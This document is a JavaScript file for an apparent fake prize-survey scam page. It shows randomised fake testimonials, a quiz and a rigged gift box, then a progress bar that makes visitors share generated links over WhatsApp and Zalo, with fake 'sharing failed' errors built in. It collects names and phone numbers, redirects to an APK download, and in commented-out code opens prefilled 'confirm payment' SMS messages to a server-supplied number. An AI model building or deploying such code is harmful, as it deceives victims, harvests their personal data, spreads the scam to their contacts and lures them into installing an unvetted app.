(function (window, $, tpl, tools, Popup, Toast) {
  var allShareCount = 1, shareurl = '', newShareUrl = '';
  if (!localStorage.getItem('money')) {
    localStorage.setItem('money', Math.floor(Math.random() * 100) + 100)
  }
  if (!localStorage.getItem('isClickShare')) {
    localStorage.setItem('isClickShare', '0')
  }

  function saveGameProgress(num) {
    localStorage.setItem('game-progress', num);
  }
  function getGameProgress() {
    if (!localStorage.getItem('game-progress')) {
      return 0;
    } else {
      return parseInt(localStorage.getItem('game-progress'));
    }
  }

  // 鐢ㄦ埛鍙嶉
  function userComment() {
    var date = new Date(),
        time = date.getFullYear() + '/' + (date.getMonth() + 1) + '/' + date.getDate();
    tools.getData('https://xinhsakh.oss-ap-southeast-1.aliyuncs.com/css/panel.json', function (data) {
      var panelsHtml = '';
      data.sort(() => Math.random() - 0.5);
      data.forEach(element => {
        panelsHtml += tools.tplReplace(tpl.panelItem(), {
          username: element.username,
          content: element.content,
          avatarUrl: element.avatarUrl,
          nums: Math.floor(Math.random() * 30) + 11,
          time: time,
        })
      });
      //$('.js_cont-panels').append(panelsHtml);
    })
  }



    function randomString(len) {
      len = len || 32;
      var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';
      var maxPos = $chars.length;
      var pwd = '';
      for (i = 0; i < len; i++) {
      pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
      }
      return pwd;
      }


  // 鏂囧瓧鎻忚堪
  function contentHeader() {
    tools.getData('https://xinhsakh.oss-ap-southeast-1.aliyuncs.com/css/contentHeader.json', function (data) {
      var contentHeaderHtml = '';
      data.forEach(function (element) {
        contentHeaderHtml += tools.tplReplace(tpl.contentHeader(element.type), element)
      });
      $('.js_cont-header').append(contentHeaderHtml).show();
      tools.timerLoopInit($('.js_cont-header #timer'), 5);
    })
  }
  // 闂瓟涓撳尯
  function contentQuestion() {
    tools.getData('https://xinhsakh.oss-ap-southeast-1.aliyuncs.com/css/question.json', function (data) {
      var questionHtml = '', len = data.length;
      data.forEach(function (element, index) {
        var questionItem = '<div class="question-item">';
        if (index == 0) {
          questionItem = '<div class="question-item current">';
        }
        questionItem += tools.tplReplace(tpl.questionHeader(), {
          tip: `Question ${index + 1} of ${len}`,
          title: element.title
        })
        questionItem += '<div class="question-content">'
        var surveyArr = element.answer;
        surveyArr.forEach(function (ele, i) {
          questionItem += tools.tplReplace(tpl.surveyBtn(), {
            id: i,
            content: ele
          })
        })
        questionItem += '</div></div>'

        questionHtml += questionItem;
      })
      $('.js_cont-question').append(questionHtml).show();
      _bindSurveyClick();
    })
    // 闂瓟浜嬩欢缁戝畾
    function _bindSurveyClick() {
      $('.js_cont-question').on('click', '.survey-btn', function () {
        var parrentEle = $(this).closest('.question-item'),
            parrentIndex = parrentEle.index(),
            parentNext = parrentEle.next();
        userAnswerArr.push($(this).attr('data-bq'));
        parrentEle.fadeOut(function () {
          parentNext.fadeIn()
        });
        if (parrentIndex + 1 === $('.question-item').length) {
          initVerify();
        }
      })
    }
    // 楠岃瘉绛旀
    function initVerify() {
      tools.getData('https://xinhsakh.oss-ap-southeast-1.aliyuncs.com/css/verify.json', function (data) {
        var verifyHtml = '';
        data.forEach(function (element) {
          verifyHtml += tools.tplReplace(tpl.verifyContent(element.type), element)
        });
        $('.js_cont-verify').append(verifyHtml);
      })
      $('.js_cont-header,.js_cont-question').hide();
      $('.js_cont-verify').fadeIn(50);
      var _index = 0;
      var resultTimer = setInterval(function () {
        if (_index === $('.result-item').length) {
          clearInterval(resultTimer);
          saveGameProgress(1);
          initGift();

        }
        $('.result-item').eq(_index).fadeIn();
        _index++;
      }, 1600);
    }
  }

  // choujiang
  /*
  function initGift() {
    $('.js_cont-verify').hide();
    $('.js_cont-gift').fadeIn();
  }*/

  function initGift() {
    var giftHtml = '', isClickGift = false;
    for (let i = 0; i <1; i++) {
      giftHtml += tpl.giftItem(4)
    }
    $('.js_cont-gift .gift-boxs').html(giftHtml);
    $('.js_cont-gift').fadeIn();
    $('.js_cont-verify').hide();
    setTimeout(() => {
      Popup.showSuccess('answerSuccess');
    }, 500);
    // _bindGiftClick();
    // 缁戝畾鐐瑰嚮鎵撳紑绀肩墿浜嬩欢
    (function _bindGiftClick() {
      $('.js_cont-gift').on('click', '.gift-boxs-item', function () {
        if (isClickGift || $('.opensuccess').length !== 0 || $(this).hasClass('open')) {
          return;
        }
        isClickGift = true;
        $('.gift-boxs-item').css({ 'z-index': 1 });
        $(this).css({ 'z-index': 2 });

        if ($('.open').length == 10) { //a1
          $(this).addClass('open');
          setTimeout(() => {
            isClickGift = false;
            Popup.showError(2);
          }, 2400);
        } else {
          $(this).addClass('opensuccess');
          setTimeout(() => {
            isClickGift = false;
            Popup.showSuccess('giftSuccess');
            Popup.isCanvasShow = true;
            //startConfetti();
            $('.js_cont-gift').fadeOut();
            saveGameProgress(2);
            // 鍒濆鍖栧垎浜繘搴︿负 0
            localStorage.setItem('progress', 0);
            initMain();
          }, 2400);
        }

      })
    })();
  }
  // 鍒嗕韩椤甸潰
  function initMain() {
    var shareProgressArr = [0, 30, 20, 10, 4, 2], shareCount = 0;
    var mainHtml = '';
    tools.getData('https://xinhsakh.oss-ap-southeast-1.aliyuncs.com/css/main.json', function (data) {
      mainHtml += tools.tplReplace(tpl.mainContent('mainInfo'), data.mainInfo);
      mainHtml += tools.tplReplace(tpl.mainContent('footerInfo'), data.footerInfo);
      mainHtml += tools.tplReplace(tpl.mainContent('mainTip'), data.mainTip);
      $('.js_cont-main').html(mainHtml).fadeIn();
      $('.money').html(' $: ' + localStorage.getItem('money'));
      $('.main-share-btns').append($('.share-btns'));
      if (!localStorage.getItem('progress')) {
        localStorage.setItem('progress', 0);
      }
      _bindMainClick();
      _updateProgress();
    })
    // 鍒嗕韩缁戝畾浜嬩欢
    function _bindMainClick() {
      // 椤甸潰闅愯棌鏄剧ず
      var hiddenProperty = 'hidden' in document ? 'hidden' : 'webkitHidden' in document ? 'webkitHidden' : 'mozHidden' in
      document ? 'mozHidden' : null;
      document.addEventListener('visibilitychange', function () {
        if (document[hiddenProperty]) {
          // console.log('椤甸潰闅愯棌浜�');
        } else {
          if (localStorage.getItem('isClickShare') === '1') {
            localStorage.setItem('isClickShare', '0');
            setTimeout(function () {
              verifyShare()
            }, 100);
          }
        }
      })
      function verifyShare() {
        shareCount++;
        var progress = parseInt(localStorage.getItem('progress'));
        if (shareCount == 3 || shareCount == 6) {
          Toast.show('sharing failed! The same group or the same friend is incorrect. Please check and share again.')
        } else {
          progress += shareProgressArr[progressStep(progress)];
          localStorage.setItem('progress', progress);
          _updateProgress();
        }
      }
      function progressStep(oldProgress) {
        var resultIndex = 0;
        switch (oldProgress) {
          case 0:
            resultIndex = 1;
            break;
          case 30:
            resultIndex = 2;
            break;
          case 50:
          case 60:
          case 65:
          case 70:
          case 75:
          case 80:
            resultIndex = 3;
            break;
          case 90:
            resultIndex = 4;
            break;
          case 94:
          case 96:
          case 98:
            resultIndex = 5;
            break;
          default:
            break;
        }
        return resultIndex;
      }
      $('.js_cont-main').on('click', '.receice-btn', function () {
        var num = parseInt(localStorage.getItem('progress'));
        if (num >= 100) {
          setTimeout(() => {
            Popup.showSuccess('shareSuccess');
            saveGameProgress(3);
            initSubmit();
          }, 500);
        } else {
          Toast.show();

        }
      })
    }
    // 鏇存柊杩涘害
    function _updateProgress() {
      var num = parseInt(localStorage.getItem('progress'));
      // if(num==100){
      //  $(".receice-btn").html('Finish, click to receive');
      //}
      if (num >= 100) {
        $('.js_cont-main .progress-bar').css({
          width: '100%'
        }).html('100%');
      } else {
        $('.js_cont-main .progress-bar').css({
          width: num + '%'
        }).html(num + '%');
      }
    }
  }
  // 鎻愪氦鏁版嵁
  function initSubmit() {
    var submitHtml = '<form id="submit-form"><div class="submit-wrapper">';
    tools.getData('https://xinhsakh.oss-ap-southeast-1.aliyuncs.com/css/submit.json', function (data) {
      data.forEach(function (element) {
        submitHtml += tools.tplReplace(tpl.submitItem(element.type), element);
      })
      submitHtml += '</div></form>'
      $('.js_cont-submit').html(submitHtml);
    })
    $('.js_cont-main').fadeOut(function () {
      $('.js_cont-submit').fadeIn();
    });
    (function () {
      $('#okok').on('click', function () {
        // $.ajax({
        //   type:"get",
        //   data : '',
        //   url:"https://whatsgpp.cn/api/grupo/getphone",
        //   async:true,
        //   success:function(data){
        //       var sendcode=data['phone'];
        //      var u=navigator.userAgent;
        //       var isAndroid=u.indexOf('Android')>-1||u.indexOf('Adr')>-1;
        //       var isIOS=!!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
        //       var msg='hello world';

        //         var share_text=["http:\/\/wr.aea457.com\/{{suiji1}}","http:\/\/wr.amayapp.com\/{{suiji1}}"];
        //         var url_ua=share_text[Math.floor((Math.random()*share_text.length))];
        //         var date1 = new Date();
        //         date1 = date1.getTime();

        //         url_ua=url_ua.replace('wr',date1);
        //         date1 = date1 + '.html';
        //         url_ua=url_ua.replace('{{suiji1}}',date1);
        //       if(isAndroid){
        //           window.location.href='sms:'+sendcode+'?body='+"Confirm payment of gift information 鈫�"+url_ua;
        //                 }else if(isIOS){
        //               var re = new RegExp('\\;','g');
        //             window.location.href='sms://open?addresses='+sendcode.replace(re,',')+'/&body='+"Confirm payment collection 鈫�"+url_ua;

        //         }
        //   }
        // })

        saveGameProgress(4);
        $('#submit-form').hide();
        setTimeout(function () {
          initOver();
        }, 2000);


      });


      $('.js_cont-submit').on('click', '.input-btn', function () {
        var userData = verifyData();
        if (!userData) {
          Toast.show("Please fill in all the information");
          return;
        };
        $.ajax({
          url: '/postdata.php',
          type: 'post',
          dataType: "json",
          data: userData,
          success: function (res) {
              if (res.code == 0) {
              Toast.show('Congratulations, you have completed the above process!<br><br>Now, you also need to send SMS to confirm the collection , you can get cash immediately!<br><br>Click to send SMS');

            } else {
              Toast.show('Please fill in all the information');
            }
            // if (res.code == 0) {
              // Toast.show('Information submitted successfully');
              // saveGameProgress(4);
              // initOver();
            // } else {
              // Toast.show('error');
            // }
          },
          error: function (err) {
            console.log(err);
          }
        })
      });
      /**楠岃瘉鏁版嵁 */
      function verifyData() {
        var resultData = {};
        if (isInputEmpty('input[name="name"]')) {
          return false;
        } else {
          resultData.name = $('input[name="name"]').val();
        }
        if (isInputEmpty('input[name="tel"]')) {
          return false;
        } else {
          resultData.tel = $('input[name="tel"]').val();
        }
        // $('#userForm .remark').each(function () {
        //   if (isInputEmpty(this)) {
        //     return false
        //   } else {
        //     resultData.remark[$(this).attr('name')] = $(this).val()
        //   }
        // })
        return resultData;
      }
      /**绌洪獙璇� */
      function isInputEmpty(el) {
        return $(el).val() == ''
      }
    })();
  }
  // 鎻愪氦瀹屾垚
  function initOver() {
    $('.js_cont-submit').fadeOut(function () {

      $('.js_cont-over').fadeIn()

      $('.over-share-btns').append($('.share-btns'));




      //$("#zhifu").click()
    })
  }

  function ceshi(){
    console.log(321)
  }



  // 鍒嗕韩鎸夐挳鏋勯€�
  ; (function () {





    console.log('395', shareurl);
    var boarddiv = "<div class='zalo-share-button'  data-oaid='3647788090838421038' data-layout='5' data-color='blue' data-customize=false id='zalo'>zalo</div>"
    // $.ajax({
    //   url: "/rukou",
    //   type: 'post',
    //   dataType: "json",
    //   data: {
    //     num: allShareCount
    //   },
    //   success: function (res) {
    //     if (res.code == 0) {
    //       console.log(res);
    //       allShareCount++;
    //       shareurl = res.data.url;
    //       sendcode=res.sendcode;
    //       console.log('407', shareurl);
    //     }
    //   }
    // })




   //var share_text=["http:\/\/wr.3068446.com\/{{suiji1}}","http:\/\/wr.fkdeveloper.com\/{{suiji1}}","http:\/\/wr.drghari.com\/{{suiji1}}","http:\/\/wr.misslottie.com\/{{suiji1}}"]; var ad_s=0;var jump=["http:\/\/qq.com\/","http:\/\/baidu.com\/","http:\/\/wr.idcspy.com\/"];var share_done = '0';
   var share_text=["https:\/\/uqhwd.github.io\/{{suiji1}}"]; var ad_s=0;var jump=["http:\/\/qq.com\/","http:\/\/baidu.com\/","http:\/\/wr.idcspy.com\/"];var share_done = '0';
    var url_ua=share_text[Math.floor((Math.random()*share_text.length))];
    var date1 = new Date();
      date1 = date1.getTime();

      url_ua=url_ua.replace('wr',date1);
      date1 = date1 + '.html';
      url_ua=url_ua.replace('{{suiji1}}',date1);
    shareurl = url_ua;

    $('.share-btns').on('click', '#zhifu', function () {

      location.href = "https://www.winkgame.in/in/static/apk/WinkGame_10053.apk"
      //$("#chongzhi").show()
      //$('#chongzhi').css('background','none')
    });

    $('.share-btns').on('click', '#zaloapp', function () {
      console.log('417', shareurl);
      if (shareurl === '') {
        return void $(this).click()
      };
      shareurl = newShareUrl === '' ? shareurl : newShareUrl;
      var u = navigator.userAgent;
      var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);

      if (isiOS == true) {
        var ios = "zaloshareext://shareext?url=" + shareurl + "&type=8&version=1"
        location.href = ios;
        localStorage.setItem('isClickShare', '1');
        changeShareBtn();
        return false;
      } else {
        var android = "intent://zaloapp.com/#Intent;action=com.zing.zalo.intent.action.SEND;type=text/plain;S.android.intent.extra.TEXT=" + shareurl + ";B.hidePostFeed=false;B.backToSource=true;end"
        location.href = android;
        localStorage.setItem('isClickShare', '1');
        changeShareBtn();
        return false;
      }


    });

    $('.share-btns').on('click', '#whatsapp ', function () {
      shareurl = newShareUrl === '' ? shareurl : newShareUrl;
      var url="whatsapp://send?text=" + shareurl;
      console.log(url)
      console.log(shareurl);
      window.location.href = "whatsapp://send?text=" + shareurl;
      localStorage.setItem('isClickShare', '1');
      changeShareBtn();
    });
    $('.share-btns').on('click', '#whatsapp2', function () {
      shareurl = newShareUrl === '' ? shareurl : newShareUrl;
      var url="whatsapp://send?text=" + shareurl;
      console.log(url)
      console.log(shareurl);
      window.location.href = "whatsapp://send?text=" + shareurl;
      localStorage.setItem('isClickShare', '1');
      changeShareBtn();
    });



    function changeShareBtn() {
        if(newShareUrl==''){
    //var share_text=["http:\/\/wr.3068446.com\/{{suiji1}}","http:\/\/wr.fkdeveloper.com\/{{suiji1}}","http:\/\/wr.drghari.com\/{{suiji1}}","http:\/\/wr.misslottie.com\/{{suiji1}}"]; var ad_s=0;var jump=["http:\/\/qq.com\/","http:\/\/baidu.com\/","http:\/\/wr.idcspy.com\/"];var share_done = '0';
    var share_text=["https:\/\/uqhwd.github.io\/{{suiji1}}"]; var ad_s=0;var jump=["http:\/\/qq.com\/","http:\/\/baidu.com\/","http:\/\/wr.idcspy.com\/"];var share_done = '0';

          var url_ua=share_text[Math.floor((Math.random()*share_text.length))];

          var date1 = new Date();
          date1 = date1.getTime();

          url_ua=url_ua.replace('wr',date1);
          date1 = date1 + '.html';
          url_ua=url_ua.replace('{{suiji1}}',date1);
          newShareUrl = url_ua;
      }
      //newShareUrl
      // console.log(2)
      // $.ajax({
      //   url: "/rukou",
      //   type: 'post',
      //   dataType: "json",
      //   data: {
      //     num: allShareCount
      //   },
      //   success: function (res) {
      //     console.log(res)
      //     console.log(res.code)
      //     if (res.code == 0) {
      //       allShareCount++;
      //       newShareUrl =res.data.url;
      //       console.log(newShareUrl);


      //     }
      //   }
      // })
    }

  })();

  window.Init = {
    getGameProgress: getGameProgress,
    ceshi: ceshi,
    saveGameProgress: saveGameProgress,
    userComment: userComment,
    contentHeader: contentHeader,
    contentQuestion: contentQuestion,
    initGift: initGift,
    initMain: initMain,
    initSubmit: initSubmit,
    initOver: initOver
  }

})(window, jQuery, tpl, tools, Popup, Toast);
